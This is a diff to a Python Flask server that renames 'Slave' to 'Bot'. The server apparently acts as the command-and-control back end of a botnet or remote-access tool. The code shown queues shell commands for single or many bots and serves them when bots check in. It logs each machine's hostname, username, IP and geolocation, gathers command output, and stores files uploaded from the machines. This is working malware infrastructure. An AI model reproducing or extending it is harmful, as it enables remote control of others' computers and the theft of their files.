@@ -21,7 +21,7 @@ import cgi
 
 from webui import require_admin
 from models import db
-from models import Slave
+from models import Bot
 from models import Command
 
 
@@ -42,57 +42,57 @@ def geolocation(ip):
 def mass_execute():
     selection = request.form.getlist('selection')
     if 'execute' in request.form:
-        for slave_id in selection:
-            Slave.query.get(slave_id).push_command(request.form['cmd'])
-        flash('Executed "%s" on %s slaves' % (request.form['cmd'], len(selection)))
+        for bot_id in selection:
+            Bot.query.get(bot_id).push_command(request.form['cmd'])
+        flash('Executed "%s" on %s bots' % (request.form['cmd'], len(selection)))
     elif 'delete' in request.form:
-        for slave_id in selection:
-            db.session.delete(Slave.query.get(slave_id))
+        for bot_id in selection:
+            db.session.delete(Bot.query.get(bot_id))
         db.session.commit()
-        flash('Deleted %s slaves' % len(selection))
-    return redirect(url_for('webui.slave_list'))
+        flash('Deleted %s bots' % len(selection))
+    return redirect(url_for('webui.bot_list'))
 
 
-@api.route('/<slave_id>/push', methods=['POST'])
+@api.route('/<bot_id>/push', methods=['POST'])
 @require_admin
-def push_command(slave_id):
-    slave = Slave.query.get(slave_id)
-    if not slave:
+def push_command(bot_id):
+    bot = Bot.query.get(bot_id)
+    if not bot:
         abort(404)
-    slave.push_command(request.form['cmdline'])
+    bot.push_command(request.form['cmdline'])
     return ''
 
 
-@api.route('/<slave_id>/stdout')
+@api.route('/<bot_id>/stdout')
 @require_admin
-def slave_console(slave_id):
-    slave = Slave.query.get(slave_id)
-    return render_template('slave_console.html', slave=slave)
+def bot_console(bot_id):
+    bot = Bot.query.get(bot_id)
+    return render_template('bot_console.html', bot=bot)
 
 
-@api.route('/<slave_id>/connect', methods=['POST'])
-def get_command(slave_id):
-    slave = Slave.query.get(slave_id)
-    if not slave:
-        slave = Slave(slave_id)
-        db.session.add(slave)
+@api.route('/<bot_id>/connect', methods=['POST'])
+def get_command(bot_id):
+    bot = Bot.query.get(bot_id)
+    if not bot:
+        bot = Bot(bot_id)
+        db.session.add(bot)
         db.session.commit()
-    # Report basic info about the slave
+    # Report basic info about the bot
     info = request.json
     if info:
         if 'platform' in info:
-            slave.operating_system = info['platform']
+            bot.operating_system = info['platform']
         if 'hostname' in info:
-            slave.hostname = info['hostname']
+            bot.hostname = info['hostname']
         if 'username' in info:
-            slave.username = info['username']
-    slave.last_online = datetime.now()
-    slave.remote_ip = request.remote_addr
-    slave.geolocation = geolocation(slave.remote_ip)
+            bot.username = info['username']
+    bot.last_online = datetime.now()
+    bot.remote_ip = request.remote_addr
+    bot.geolocation = geolocation(bot.remote_ip)
     db.session.commit()
-    # Return pending commands for the slave
+    # Return pending commands for the bot
     cmd_to_run = ''
-    cmd = slave.commands.order_by(Command.timestamp.desc()).first()
+    cmd = bot.commands.order_by(Command.timestamp.desc()).first()
     if cmd:
         cmd_to_run = cmd.cmdline
         db.session.delete(cmd)
@@ -100,27 +100,27 @@ def get_command(slave_id):
     return cmd_to_run
 
 
-@api.route('/<slave_id>/report', methods=['POST'])
-def report_command(slave_id):
-    slave = Slave.query.get(slave_id)
-    if not slave:
+@api.route('/<bot_id>/report', methods=['POST'])
+def report_command(bot_id):
+    bot = Bot.query.get(bot_id)
+    if not bot:
         abort(404)
     out = request.form['output']
-    slave.output += cgi.escape(out)
-    db.session.add(slave)
+    bot.output += cgi.escape(out)
+    db.session.add(bot)
     db.session.commit()
     return ''
 
 
-@api.route('/<slave_id>/upload', methods=['POST'])
-def upload(slave_id):
-    slave = Slave.query.get(slave_id)
-    if not slave:
+@api.route('/<bot_id>/upload', methods=['POST'])
+def upload(bot_id):
+    bot = Bot.query.get(bot_id)
+    if not bot:
         abort(404)
     for file in request.files.values():
         upload_dir = os.path.join(current_app.config['UPLOAD_FOLDER'])
-        slave_dir = slave_id
-        store_dir = os.path.join(upload_dir, slave_dir)
+        bot_dir = bot_id
+        store_dir = os.path.join(upload_dir, bot_dir)
         filename = secure_filename(file.filename)
         if not os.path.exists(store_dir):
             os.makedirs(store_dir)
@@ -129,8 +129,8 @@ def upload(slave_id):
             filename = "_" + filename
             file_path = os.path.join(store_dir, filename)
         file.save(file_path)
-        download_link = url_for('webui.uploads', path=slave_dir + '/' + filename)
-        slave.output += '[*] File uploaded: <a target="_blank" href="' + download_link + '">' + download_link + '</a>\n'
-        db.session.add(slave)
+        download_link = url_for('webui.uploads', path=bot_dir + '/' + filename)
+        bot.output += '[*] File uploaded: <a target="_blank" href="' + download_link + '">' + download_link + '</a>\n'
+        db.session.add(bot)
         db.session.commit()
     return ''
